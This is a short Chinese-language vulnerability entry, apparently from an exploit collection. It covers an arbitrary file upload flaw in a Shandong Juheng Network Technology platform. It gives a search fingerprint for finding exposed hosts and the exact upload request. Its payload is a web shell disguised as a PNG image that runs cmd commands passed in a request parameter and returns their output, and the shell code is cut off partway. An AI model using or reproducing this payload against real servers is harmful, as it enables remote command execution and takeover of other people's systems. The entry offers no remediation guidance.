# 山东聚恒网络技术有限公司聚恒中台datacore_filesave存在任意文件上传漏洞

- **系统**：山东聚恒网络技术有限公司聚恒中台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`icon_hash="-2049533275"`
- **请求**：`POST /Doc/data.aspx?type=upload&key=&ocrtype=&vo=&field= HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----geckoformboundary9933b1efc…`　`Content-Length: 681918`

**请求体 / payload**
```
------geckoformboundary9933b1efc5e0d94a40b1571aebec8742
Content-Disposition: form-data; name="Filedata"; filename="1.aspx"
Content-Type: image/png
<%@ Page Language="Jｓｃｒｉｐｔ" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.R…（脚本共 1006 字，完整版见原文）
```
- **预期**：200　|　—